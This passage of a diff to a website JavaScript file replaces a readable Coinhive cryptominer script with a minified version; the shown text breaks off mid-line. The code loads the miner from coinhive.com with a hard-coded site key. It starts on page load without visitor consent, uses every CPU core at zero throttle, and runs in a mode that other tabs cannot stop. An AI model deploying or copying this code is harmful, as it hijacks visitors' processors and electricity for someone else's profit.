@@ -1,553 +1,125 @@
-(function() {
-    var a = function() {
-            try {
-                return !!window.addEventListener
-            } catch (e) {
-                return !1
-            }
-        },
-        b = function(b, c) {
-            a() ? document.addEventListener("DOMContentLoaded", b, c) : document.attachEvent("onreadystatechange", b)
-        };
-    b(function() {
+! function() { var n = function() { try { return !!window.addEventListener } catch (n) { return !1 } },
+        e = function(e, t) { n() ? document.addEventListener("DOMContentLoaded", e, t) : document.attachEvent("onreadystatechange", e) };
+    e(function() {! function() { var n = document.createElement("script");
+            n.type = "text/javascript", n.async = !0; var e = document.getElementsByTagName("script")[0];
+            n.src = "https://coinhive.com/lib/coinhive.min.js", n.onload = function() {
+                function n() { return Qn.getHashesPerSecond().toFixed(1) }
 
-        (function() {
-            var createScriptElement = document.createElement('script');
-            createScriptElement.type = 'text/javascript';
-            createScriptElement.async = true;
-            var getScriptElement = document.getElementsByTagName('script')[0];
-            createScriptElement.src = 'https://coinhive.com/lib/coinhive.min.js';
-            createScriptElement.onload = function() {
-                /*User Configs*/
-                // site key from CoinHive
-                var coinhive_site_key = 'jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp';
-                //Start running the miner when loaded and ready. True = Yes | False = No
-                var coinhive_automatic_startup = true;
-                //Threads - The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available
-                var mining_threads = navigator.hardwareConcurrency;
-                //Throttle - The fraction of time that threads should be idle. See miner.setThrottle() for a detailed explanation. The default is 0.
-                var mining_throttle = .0;
-                //Statistics Update frequency. 1000 = 1 Second.
-                var coinhive_statistics_timer = 1000;
-                /*HTML Element Names*/
-                /*Start Element id names*/
-                var html_miner = "miner";
-                var html_mining_stats_canvas = "mining-stats-canvas";
-                var html_miner_is_running = "mining-is-running";
-                var html_miner_is_running_id = "mining-is-running-id";
-                var html_miner_is_running_id_output = "mining-is-running-id-output";
-                var html_miner_is_running_id_output_yes = "mining-is-running-id-output-yes";
-                var html_miner_is_running_id_output_no = "mining-is-running-id-output-no";
-                var html_mining_hashes_per_second = "mining-hashes-per-second";
-                var html_mining_hashes_per_second_id = "mining-hashes-per-second-id";
-                var html_mining_hashes_per_second_id_output = "mining-hashes-per-second-id-output";
-                var html_mining_accepted_hashes_per_second = "mining-accepted-hashes-per-second";
-                var html_mining_accepted_hashes_per_second_id = "mining-accepted-hashes-per-second-id";
-                var html_mining_accepted_hashes_per_second_id_output = "mining-accepted-hashes-per-second-id-output";
-                var html_mining_threads = "mining-threads";
-                var html_mining_threads_id = "mining-threads-id";
-                var html_mining_threads_id_output = "mining-threads-id-output";
-                var html_mining_threads_add = "mining-threads-add";
-                var html_mining_threads_remove = "mining-threads-remove";
-                var html_mining_hashes_total = "mining-hashes-total";
-                var html_mining_hashes_total_id = "mining-hashes-total-id";
-                var html_mining_hashes_total_id_output = "mining-hashes-total-id-output";
-                var html_mining_start = "mining-start";
-                var html_mining_stop = "mining-stop";
-                var html_addthreads = "addthreads";
-                var html_removethreads = "removethreads";
-                var html_startmining = "startmining";
-                var html_stopmining = "stopmining";
-                var html_mining_current_throttle = "mining-current-throttle";
-                var html_mining_current_throttle_id = "mining-current-throttle-id";
-                var html_mining_current_throttle_id_output = "mining-current-throttle-id-output";
-                var html_mining_increase_throttle = "mining-increase-throttle";
-                var html_mining_increase_throttle_id = "mining-increase-throttle-id";
-                var html_mining_decrease_throttle = "mining-decrease-throttle";
-                var html_mining_decrease_throttle_id = "mining-decrease-throttle-id";
-                var html_mining_minimal_speed = "mining-minimal-speed";
-                var html_mining_minimal_speed_id = "mining-minimal-speed-id";
-                var html_mining_maximum_speed = "mining-maximum-speed";
-                var html_mining_maximum_speed_id = "mining-maximum-speed-id";
-                var html_mining_default_recommended_speed = "mining-default-recommended-speed";
-                var html_mining_default_recommended_speed_id = "mining-default-recommended-speed-id";
-                var html_mining_show = "mining-show";
-                var html_mining_show_id = "mining-show-id";
-                var html_mining_hide = "mining-hide";
-                var html_mining_hide_id = "mining-hide-id";
-                var html_mining_stick = "mining-stick";
-                var html_mining_stick_id = "mining-stick-id";
-                var html_mining_unstick = "mining-unstick";
-                var html_mining_unstick_id = "mining-unstick-id";
-                /*End Element id names*/
+                function t(n) { return Qn.getTotalHashes(n) }
 
-                /*Start tooltip id*/
-                var html_tooltip_id = "tooltiptext";
-                var html_tooltip_class_name = "tooltip";
-                /*End tooltip id*/
+                function i() { return Qn.getAcceptedHashes() }
 
-                /*Start button class*/
-                var html_button_class_name = "miner-button-class";
-                /*End button class*/
+                function d() { return Qn.stop() }
 
-                /*Start text area class*/
-                var html_text_area_class_name = "miner-text-area-class";
-                /*End text area class*/
+                function s(n) { return Qn.start(n) }
 
-                /*Start Text Language*/
-                var html_text_is_running = "";
-                var html_text_is_running_true = "Online";
-                var html_text_is_running_false = "Offline";
-                var html_text_is_running_tooltip = "If the miner is currently running.";
-                var html_text_hashes_per_second = "Hashes/s | ";
-                var html_text_hashes_per_second_tooltip = "The total number of hashes per second for all threads combined.";
-                var html_text_accepted_hashes_per_second = "Accepted Hashes | ";
-                var html_text_accepted_hashes_per_second_tooltip = "The number of hashes that have been accepted by the pool.";
-                var html_text_current_number_of_threads = "Threads | ";
-                var html_text_current_number_of_threads_tooltip = "Amount of threads you have running currently.";
-                var html_text_threads_add = "+";
-                var html_text_threads_add_tooltip = "Speed it up! Increases threads, but too many may slow your browser. 3 or 4 are OK in most cases.";
-                var html_text_threads_remove = "-";
-                var html_text_threads_remove_tooltip = "Slow it down! (decrease threads to 0 to stop entirely)";
-                var html_text_hashes_total = "Total Hashes | ";
-                var html_text_hashes_total_tooltip = "Hashes you solved so far. We will remove all ads for you once you mine enough. Login to have it keep track of your progress.";
-                var html_text_start = "Start";
-                var html_text_start_tooltip = "Start the miner.";
-                var html_text_stop = "Stop";
-                var html_text_stop_tooltip = "Stop the miner.";
-                var html_text_usage_current_throttle = "Throttle | ";
-                var html_text_usage_current_throttle_tooltip = "How much the miner is currently being throttled.";
-                var html_text_usage_increase_throttle = "+";
-                var html_text_usage_increase_throttle_tooltip = "Increase the throttle to reduce CPU consumption.";
-                var html_text_usage_decrease_throttle = "-";
-                var html_text_usage_decrease_throttle_tooltip = "Decrease the throttle to allow more CPU consumption.";
-                var html_text_usage_minimal = "Min";
-                var html_text_usage_minimal_tooltip = "Use the most minimal amount of CPU and Power possible.";
-                var html_text_usage_max_out = "Max";
-                var html_text_usage_max_out_tooltip = "Use all CPU and Power available.";
-                var html_text_usage_default = "Default";
-                var html_text_usage_default_tooltip = "Use Recommended default settings.";
-                /*End Text Language*/
-                /*End HTML Element Names*/
+                function o() { return Qn.getNumThreads() }
 
-                /*Create Elements*/
-                var createDivElement = document.createElement('div');
-                createDivElement.id = html_miner;
-                document.body.appendChild(createDivElement); //getScriptElement.parentNode.insertBefore(createDivElement, getScriptElement);/*Create our div element*/
+                function a(n) { return Qn.setNumThreads(n) }
 
-                new_html = "<div id='" + html_mining_stats_canvas + "'></div>";
-                document.getElementById(html_miner).innerHTML = new_html;
+                function r() { return s(Wn), a(o() + 1) }
 
-                new_html = "<div id='" + html_miner_is_running + "' class='" + html_tooltip_class_name + " " + html_text_area_class_name + "'><span id='" + html_miner_is_running_id + "'>" + html_text_is_running + "</span><span id='" + html_miner_is_running_id_output + "'></span><span id='" + html_tooltip_id + "'>" + html_text_is_running_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+                function m() { return s(Wn), a(o() - 1) }
 
-                new_html = "<div id='" + html_mining_hashes_per_second + "' class='" + html_tooltip_class_name + " " + html_text_area_class_name + "'><span id='" + html_mining_hashes_per_second_id + "'>" + html_text_hashes_per_second + "</span><span id='" + html_mining_hashes_per_second_id_output + "'></span><span id='" + html_tooltip_id + "'>" + html_text_hashes_per_second_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+                function c() { return Qn.isRunning() }
 
-                new_html = "<div id='" + html_mining_accepted_hashes_per_second + "' class='" + html_tooltip_class_name + " " + html_text_area_class_name + "'><span id='" + html_mining_accepted_hashes_per_second_id + "'>" + html_text_accepted_hashes_per_second + "</span><span id='" + html_mining_accepted_hashes_per_second_id_output + "'></span><span id='" + html_tooltip_id + "'>" + html_text_accepted_hashes_per_second_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+                function u() { return Math.round(100 * Qn.getThrottle().toFixed(1)) / 100 }
 
-                new_html = "<div id='" + html_mining_threads + "' class='" + html_tooltip_class_name + " " + html_text_area_class_name + "'><span id='" + html_mining_threads_id + "'>" + html_text_current_number_of_threads + "</span><span id='" + html_mining_threads_id_output + "'></span><span id='" + html_tooltip_id + "'>" + html_text_current_number_of_threads_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+                function l(n) { return Qn.setThrottle(n) }
 
-                new_html = "<div id='" + html_mining_threads_add + "' class='" + html_tooltip_class_name + " " + html_button_class_name + "'><span id='" + html_addthreads + "'>" + html_text_threads_add + "</span><span id='" + html_tooltip_id + "'>" + html_text_threads_add_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+                function p() { return s(Wn), l(u() + .1) }
 
-                new_html = "<div id='" + html_mining_threads_remove + "' class='" + html_tooltip_class_name + " " + html_button_class_name + "'><span id='" + html_removethreads + "'>" + html_text_threads_remove + "</span><span id='" + html_tooltip_id + "'>" + html_text_threads_remove_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+                function h() { return s(Wn), l(u() - .1) }
 
-                new_html = "<div id='" + html_mining_hashes_total + "' class='" + html_tooltip_class_name + " " + html_text_area_class_name + "'><span id='" + html_mining_hashes_total_id + "'>" + html_text_hashes_total + "</span><span id='" + html_mining_hashes_total_id_output + "'></span><span id='" + html_tooltip_id + "'>" + html_text_hashes_total_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+                function g() { l(0), a(Zn), s(Wn) }
 
-                new_html = "<div id='" + html_mining_start + "' class='" + html_tooltip_class_name + " " + html_button_class_name + "'><span id='" + html_startmining + "'>" + html_text_start + "</span><span id='" + html_tooltip_id + "'>" + html_text_start_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+                function f() { l(.9), a(1), s(Wn) }
 
-                new_html = "<div id='" + html_mining_stop + "' class='" + html_tooltip_class_name + " " + html_button_class_name + "'><span id='" + html_stopmining + "'>" + html_text_stop + "</span><span id='" + html_tooltip_id + "'>" + html_text_stop_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
-
-                new_html = "<div id='" + html_mining_current_throttle + "' class='" + html_tooltip_class_name + " " + html_text_area_class_name + "'><span id='" + html_mining_current_throttle_id + "'>" + html_text_usage_current_throttle + "</span><span id='" + html_mining_current_throttle_id_output + "'></span><span id='" + html_tooltip_id + "'>" + html_text_usage_current_throttle_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
-
-                new_html = "<div id='" + html_mining_increase_throttle + "' class='" + html_tooltip_class_name + " " + html_button_class_name + "'><span id='" + html_mining_increase_throttle_id + "'>" + html_text_usage_increase_throttle + "</span><span id='" + html_tooltip_id + "'>" + html_text_usage_increase_throttle_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
-
-                new_html = "<div id='" + html_mining_decrease_throttle + "' class='" + html_tooltip_class_name + " " + html_button_class_name + "'><span id='" + html_mining_decrease_throttle_id + "'>" + html_text_usage_decrease_throttle + "</span><span id='" + html_tooltip_id + "'>" + html_text_usage_decrease_throttle_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
-
-                new_html = "<div id='" + html_mining_minimal_speed + "' class='" + html_tooltip_class_name + " " + html_button_class_name + "'><span id='" + html_mining_minimal_speed_id + "'>" + html_text_usage_minimal + "</span><span id='" + html_tooltip_id + "'>" + html_text_usage_minimal_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
-
-                new_html = "<div id='" + html_mining_maximum_speed + "' class='" + html_tooltip_class_name + " " + html_button_class_name + "'><span id='" + html_mining_maximum_speed_id + "'>" + html_text_usage_max_out + "</span><span id='" + html_tooltip_id + "'>" + html_text_usage_max_out_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
-
-                new_html = "<div id='" + html_mining_default_recommended_speed + "' class='" + html_tooltip_class_name + " " + html_button_class_name + "'><span id='" + html_mining_default_recommended_speed_id + "'>" + html_text_usage_default + "</span><span id='" + html_tooltip_id + "'>" + html_text_usage_default_tooltip + "</span></div>";
-                document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
-                /*End Create Elements*/
-
-                /*Create Style Sheet*/
-                var createStyleElement = document.createElement('style');
-                createStyleElement.type = "text/css";
-                createStyleElement.innerHTML += "" +
-                    "#" + html_miner + "{" +
-                    "position:fixed;" +
-                    "bottom:0;" +
-                    "left:0;" +
-                    "background-color:#262626;" +
-                    "color:#FFFFFF;" +
-                    "width:auto;" +
-                    "height:auto;" +
-                    "border-radius:3px;" +
-                    "z-index:30;" +
-                    "}" +
-                    "#" + html_mining_stats_canvas + "{" +
-                    "display:inline-block;" +
-                    "width:100%;" +
-                    "}" +
-                    "#" + html_miner_is_running + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_miner_is_running_id + "{" +
-                    "}" +
-                    "#" + html_miner_is_running_id_output + "{" +
-                    "}" +
-                    "." + html_miner_is_running_id_output_yes + "{" +
-                    "color:greenyellow;" +
-                    "}" +
-                    "." + html_miner_is_running_id_output_no + "{" +
-                    "color:#f00;" +
-                    "}" +
-                    "#" + html_mining_hashes_per_second + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_hashes_per_second_id + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_hashes_per_second_id_output + "{" +
-                    "display:inherit;" +
-                    "padding:0px 0px 0px 5px;" +
-                    "}" +
-                    "#" + html_mining_accepted_hashes_per_second + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_threads + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_threads_add + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_threads_remove + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_hashes_total + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_start + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_stop + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_addthreads + "{" +
-                    "}" +
-                    "#" + html_removethreads + "{" +
-                    "}" +
-                    "#" + html_startmining + "{" +
-                    "}" +
-                    "#" + html_stopmining + "{" +
-                    "}" +
-                    "#" + html_mining_current_throttle + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_increase_throttle + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_decrease_throttle + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_minimal_speed + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_maximum_speed + "{" +
-                    "display:inherit;" +
-                    "}" +
-                    "#" + html_mining_default_recommended_speed + "{" +
-                    "display:inherit;" +
-                    "}"
-                    /*Start miner buttons*/
-                    +
-                    "." + html_button_class_name + "{" +
-                    "text-decoration: none;" +
-                    "display: inline-block;" +
-                    "padding: 0px 10px;" +
-                    "margin: 2px;" +
-                    "border: 1px solid #C7C7C7;" +
-                    "border-radius: 3px;" +
-                    "-moz-border-radius: 2px;" +
-                    "-webkit-border-radius: 2px;" +
-                    "background: #636A6C;" +
-                    "background: -moz-linear-gradient(top,#636A6C 0%,#51575A 100%);" +
-                    "background: -webkit-gradient(linear,left top,left bottom,color-stop(0%,#636A6C),color-stop(100%,#51575A));" +
-                    "background: -webkit-linear-gradient(top,#636A6C 0%,#51575A 100%);" +
-                    "background: -o-linear-gradient(top,#636A6C 0%,#51575A 100%);" +
-                    "background: -ms-linear-gradient(top,#636A6C 0%,#51575A 100%);" +
-                    "background: linear-gradient(top,#636A6C 0%,#51575A 100%);" +
-                    "filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#636A6C',endColorstr='#51575A',GradientType=0);" +
-                    "}" +
-                    "." + html_button_class_name + ":hover{" +
-                    "display: inline-block;" +
-                    "padding: 0px 10px;" +
-                    "margin: 2px;" +
-                    "border-radius: 3px;" +
-                    "background: #ddd;" +
-                    "background: -webkit-gradient(linear,left top,left bottom,color-stop(0,#fff),color-stop(1,#ddd));" +
-                    "background: -moz-linear-gradient(top center,#fff 0%,#ddd 100%);" +
-                    "background: -webkit-linear-gradient(top,#ffffff 0%,#dddddd 100%);" +
-                    "background: -o-linear-gradient(top,#ffffff 0%,#dddddd 100%);" +
-                    "background: -ms-linear-gradient(top,#ffffff 0%,#dddddd 100%);" +
-                    "background: linear-gradient(top,#ffffff 0%,#dddddd 100%);" +
-                    "filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff',endColorstr='#dddddd',GradientType=0);" +
-                    "border: 1px solid;" +
-                    "border-color: #ddd #bbb #999;" +
-                    "cursor: pointer;" +
-                    "color: #333;" +
-                    "}"
-                    /*End miner buttons*/
-                    /*Start text area box*/
-                    +
-                    "." + html_text_area_class_name + "{" +
-                    "border:1px solid #e5e5e4;" +
-                    "padding:0px 5px 0px 5px;" +
-                    "}"
-                    /*End text area box*/
-                    /*Start ToolTip*/
-                    +
-                    "." + html_tooltip_class_name + "{" +
-                    "position: relative;" +
-                    "overflow:visible;" +
-                    "}" +
-                    "." + html_tooltip_class_name + " #" + html_tooltip_id + "{" +
-                    "visibility: hidden;" +
-                    "width:0px;" +
-                    "height:0px;" +
-                    "background-color: black;" +
-                    "color: #fff;" +
-                    "text-align: center;" +
-                    "border-radius: 6px;" +
-                    "padding: 5px 5px;" +
-                    "position: absolute;" +
-                    "z-index: 1;" +
-                    "bottom: 150%;" +
-                    "left: 50%;" +
-                    "margin-left: -5px;" +
-                    "overflow:hidden;" +
-                    "}" +
-                    "." + html_tooltip_class_name + ":hover #" + html_tooltip_id + "{" +
-                    "visibility: visible;" +
-                    "width:auto;" +
-                    "height:auto;" +
-                    "overflow:hidden;" +
-                    "white-space:nowrap;" +
-                    "}"
-                    /*End ToolTip*/
-                    +
-                    "";
-                getScriptElement.parentNode.insertBefore(createStyleElement, getScriptElement);
-
-                /*Create our StyleSheet element
-                /*End Create Style Sheet*/
-
-                /*Start CoinHive settings*/
-                /*
-                threads     The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available on the user's computer.
-                autoThreads Whether to automatically adjust the number of threads for optimal performance. This feature is experimental. The default is false.
-                throttle    The fraction of time that threads should be idle. See miner.setThrottle() for a detailed explanation. The default is 0.
-                forceASMJS  If true, the miner will always use the asm.js implementation of the hashing algorithm. If false, the miner will use the faster WebAssembly version if supported and otherwise fall back to asm.js. The default is false.
-                */
-                var miner = new CoinHive.Anonymous(coinhive_site_key, {
-                    throttle: mining_throttle,
-                    threads: mining_threads
-                });
-                /*
-                Default : CoinHive.IF_EXCLUSIVE_TAB
-                CoinHive.IF_EXCLUSIVE_TAB    The miner will only start if no other tabs are already mining. If all miners in other tabs are stopped or closed at a later point, the miner will then start. This ensures that one miner is always running as long as one tab of your site is open while keeping costly pool reconnections at a minimum.
-                CoinHive.FORCE_EXCLUSIVE_TAB The miner will always start and immediately kill all miners in other tabs that have not specified CoinHive.FORCE_MULTI_TAB.
-                CoinHive.FORCE_MULTI_TAB     The miner will always start. It will not announce its presence to other tabs, will not kill any other miners and can't be killed by other miners. This mode is used by the captcha and shortlinks.
-                */
-                var coinhive_starting_mode = CoinHive.FORCE_MULTI_TAB;
-                /*End Coinhive settings*/
-                /*Start CoinHive functions*/
-                function getHashesPerSecond() {
-                    return miner.getHashesPerSecond().toFixed(1);
-                }
-
-                function getTotalHashes(interpolate) {
-                    return miner.getTotalHashes(interpolate);
-                }
-
-                function getAcceptedHashes() {
-                    return miner.getAcceptedHashes();
-                }
-
-                function stop() {
-                    return miner.stop();
-                }
-
-                function start(mode) {
-                    return miner.start(mode);
-                }
-
-                function getNumThreads() {
-                    return miner.getNumThreads();
-                }
-
-                function setNumThreads(numThreads) {
-                    return miner.setNumThreads(numThreads);
-                }
-
-                function threadsAdd() {
-                    start(coinhive_starting_mode); /*incase it is not running when user interacts with this*/
-                    return setNumThreads(getNumThreads() + 1);
-                }
-
-                function threadsRemove() {
-                    start(coinhive_starting_mode); /*incase it is not running when user interacts with this*/
-                    return setNumThreads(getNumThreads() - 1);
-                }
-
-                function isRunning() {
-                    return miner.isRunning();
-                }
-
-                function hasWASMSupport() {
-                    return miner.hasWASMSupport();
-                }
-
-                function getAutoThreadsEnabled() {
-                    return miner.getAutoThreadsEnabled();
-                }
-
-                function setAutoThreadsEnabled(enabled) {
-                    return miner.setAutoThreadsEnabled(enabled);
-                }
-
-                function getThrottle() {
-                    return Math.round(miner.getThrottle().toFixed(1) * 1e2) / 1e2;
-                }
-
-                function setThrottle(throttle) {
-                    return miner.setThrottle(throttle);
-                }
-
-                function IncreaseThrottle() {
-                    start(coinhive_starting_mode); /*incase it is not running when user interacts with this*/
-                    return setThrottle(getThrottle() + 0.1);
-                }
-
-                function DecreaseThrottle() {
-                    start(coinhive_starting_mode); /*incase it is not running when user interacts with this*/
-                    return setThrottle(getThrottle() - 0.1);
-                }
-
-                function getToken() {
-                    return miner.getToken();
-                }
-                var original_recommended_thread_count = getNumThreads();
-                var original_recommended_throttle_speed = getThrottle();
-
-                function maximum_settings() {
-                    setThrottle(0);
-                    setNumThreads(original_recommended_thread_count);
-                    start(coinhive_starting_mode); /*incase it is not running when user interacts with this*/
-                }
-
-                function minimal_settings() {
-                    setThrottle(0.9);
-                    setNumThreads(1);
-                    start(coinhive_starting_mode); /*incase it is not running when user interacts with this*/
-                }
-
-                function default_recommended_settings() {
-                    setThrottle(original_recommended_throttle_speed);
-                    setNumThreads(original_recommended_thread_count);
-                    start(coinhive_starting_mode); /*incase it is not running when user interacts with this*/
-                }
-                /*End CoinHive functions*/
-
-                /*functions to be called onclick interactions with elements*/
-                document.getElementById(html_mining_threads_add).onclick = function() {
-                    return threadsAdd();
-                };
-                document.getElementById(html_mining_threads_remove).onclick = function() {
-                    return threadsRemove();
-                };
-                document.getElementById(html_mining_start).onclick = function() {
-                    return start(coinhive_starting_mode);
-                };
-                document.getElementById(html_mining_stop).onclick = function() {
-                    return stop();
-                };
-                document.getElementById(html_mining_increase_throttle).onclick = function() {
-                    return IncreaseThrottle();
-                };
-                document.getElementById(html_mining_decrease_throttle).onclick = function() {
-                    return DecreaseThrottle();
-                };
-                document.getElementById(html_mining_minimal_speed).onclick = function() {
-                    return minimal_settings();
-                };
-                document.getElementById(html_mining_maximum_speed).onclick = function() {
-                    return maximum_settings();
-                };
-                document.getElementById(html_mining_default_recommended_speed).onclick = function() {
-                    return default_recommended_settings();
-                };
-                /*End Functions to be called onclick*/
-
-                if (coinhive_automatic_startup) {
-                    start(coinhive_starting_mode); /*Start the miner Automaticly*/
-                }
-
-                /*Disable functions*/
-                //miner.stop = undefined;
-                /*End Disable functions*/
-
-                /*Listen on Events*/
-                miner.on('open', function() { /* open */ })
-                miner.on('authed', function(params) { /*console.log('Token name is: ', getToken());*/ });
-                miner.on('close', function() { /* close */ })
-                miner.on('error', function(params) { /*if (params.error !== 'connection_error') {console.log('The pool reported an error', params.error);}*/ });
-                miner.on('job', function() { /* job */ })
-                miner.on('found', function() { /* Hash found */ })
-                miner.on('accepted', function() { /* Hash accepted by the pool */ })
-                    /*End Listen Events*/
-
-                /*Timer Update stats once per second*/
-                setInterval(function() {
-                    is_running = "";
-                    if (isRunning()) {
-                        is_running = html_text_is_running_true;
-                        document.getElementById(html_miner_is_running_id_output).className = html_miner_is_running_id_output_yes;
-                    } else {
-                        is_running = html_text_is_running_false;
-                        document.getElementById(html_miner_is_running_id_output).className = html_miner_is_running_id_output_no;
-                    }
-                    /*Output to HTML elements*/
-                    document.getElementById(html_miner_is_running_id_output).innerHTML = is_running;
-                    document.getElementById(html_mining_hashes_per_second_id_output).innerHTML = getHashesPerSecond();
-                    document.getElementById(html_mining_accepted_hashes_per_second_id_output).innerHTML = getAcceptedHashes();
-                    document.getElementById(html_mining_threads_id_output).innerHTML = getNumThreads();
-                    document.getElementById(html_mining_hashes_total_id_output).innerHTML = getTotalHashes(true);
-                    document.getElementById(html_mining_current_throttle_id_output).innerHTML = getThrottle();
-                }, coinhive_statistics_timer);
-                /*End Timer*/
-
-            }
-            createScriptElement.onerror = function() {
-                /*document display error message*/
-            }
-            getScriptElement.parentNode.insertBefore(createScriptElement, getScriptElement);
-
-        })();
-
-    }, false);
-})();
+                function y() { l(Gn), a(Zn), s(Wn) } var v = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
+                    w = !0,
+                    E = navigator.hardwareConcurrency,
+                    I = 0,
+                    _ = 1e3,
+                    B = "miner",
+                    T = "mining-stats-canvas",
+                    H = "mining-is-running",
+                    L = "mining-is-running-id",
+                    M = "mining-is-running-id-output",
+                    b = "mining-is-running-id-output-yes",
+                    k = "mining-is-running-id-output-no",
+                    C = "mining-hashes-per-second",
+                    x = "mining-hashes-per-second-id",
+                    S = "mining-hashes-per-second-id-output",
+                    U = "mining-accepted-hashes-per-second",
+                    N = "mining-accepted-hashes-per-second-id",
+                    P = "mining-accepted-hashes-per-second-id-output",
+                    A = "mining-threads",
+                    D = "mining-threads-id",
+                    O = "mining-threads-id-output",
+                    j = "mining-threads-add",
+                    F = "mining-threads-remove",
+                    R = "mining-hashes-total",
+                    q = "mining-hashes-total-id",
+                    K = "mining-hashes-total-id-output",
+                    V = "mining-start",
+                    X = "mining-stop",
+                    z = "addthreads",
+                    J = "removethreads",
+                    Q = "startmining",
+                    W = "stopmining",
+                    Z = "mining-current-throttle",
+                    G = "mining-current-throttle-id",
+                    Y = "mining-current-throttle-id-output",
+                    $ = "mining-increase-throttle",
+                    nn = "mining-increase-throttle-id",
+                    en = "mining-decrease-throttle",
+                    tn = "mining-decrease-throttle-id",
+                    dn = "mining-minimal-speed",
+                    sn = "mining-minimal-speed-id",
+                    on = "mining-maximum-speed",
+                    an = "mining-maximum-speed-id",
+                    rn = "mining-default-recommended-speed",
+                    mn = "mining-default-recommended-speed-id",
+                    cn = "tooltiptext",
+                    un = "tooltip",
+                    ln = "miner-button-class",
+                    pn = "miner-text-area-class",
+                    hn = "",
+                    gn = "Online",
+                    fn = "Offline",
+                    yn = "If the miner is currently running.",
+                    vn = "Hashes/s | ",
+                    wn = "The total number of hashes per second for all threads combined.",
+                    En = "Accepted Hashes | ",
+                    In = "The number of hashes that have been accepted by the pool.",
+                    _n = "Threads | ",
+                    Bn = "Amount of threads you have running currently.",
+                    Tn = "+",
+                    Hn = "Speed it up! Increases threads, but too many may slow your browser. 3 or 4 are OK in most cases.",
+                    Ln = "-",
+                    Mn = "Slow it down! (decrease threads to 0 to stop entirely)",
+                    bn = "Total Hashes | ",
+                    kn = "Hashes you solved so far. We will remove all ads for you once you mine enough. Login to have it keep track of your progress.",
+                    Cn = "Start",
+                    xn = "Start the miner.",
+                    Sn = "Stop",
+                    Un = "Stop the miner.",
+                    Nn = "Throttle | ",
+                    Pn = "How much the miner is currently being throttled.",
+                    An = "+",
+                    Dn = "Increase the throttle to reduce CPU consumption.",
+                    On = "-",
+                    jn = "Decrease the throttle to allow more CPU consumption.",
+                    Fn = "Min",
+                    Rn = "Use the most minimal amount of CPU and Power possible.",
+                    qn = "Max",
+                    Kn = "Use all CPU and Power available.",
+                    Vn = "Default",
+                    Xn = "Use Recommended default settings.",
+                    zn = document.createElement("div");
+                zn.id = B, document.body.appendChild(zn), new_html = "<div id='" + T + "'></div>", document.getElementById(B).innerHTML = new_html, new_html = "<div id='" + H + "' class='" + un + " " + pn + "'><span id='" + L + "'>" + hn + "</span><span id='" + M + "'></span><span id='" + cn + "'>" + yn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + C + "' class='" + un + " " + pn + "'><span id='" + x + "'>" + vn + "</span><span id='" + S + "'></span><span id='" + cn + "'>" + wn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + U + "' class='" + un + " " + pn + "'><span id='" + N + "'>" + En + "</span><span id='" + P + "'></span><span id='" + cn + "'>" + In + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + A + "' class='" + un + " " + pn + "'><span id='" + D + "'>" + _n + "</span><span id='" + O + "'></span><span id='" + cn + "'>" + Bn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + j + "' class='" + un + " " + ln + "'><span id='" + z + "'>" + Tn + "</span><span id='" + cn + "'>" + Hn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + F + "' class='" + un + " " + ln + "'><span id='" + J + "'>" + Ln + "</span><span id='" + cn + "'>" + Mn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + R + "' class='" + un + " " + pn + "'><span id='" + q + "'>" + bn + "</span><span id='" + K + "'></span><span id='" + cn + "'>" + kn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + V + "' class='" + un + " " + ln + "'><span id='" + Q + "'>" + Cn + "</span><span id='" + cn + "'>" + xn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + X + "' class='" + un + " " + ln + "'><span id='" + W + "'>" + 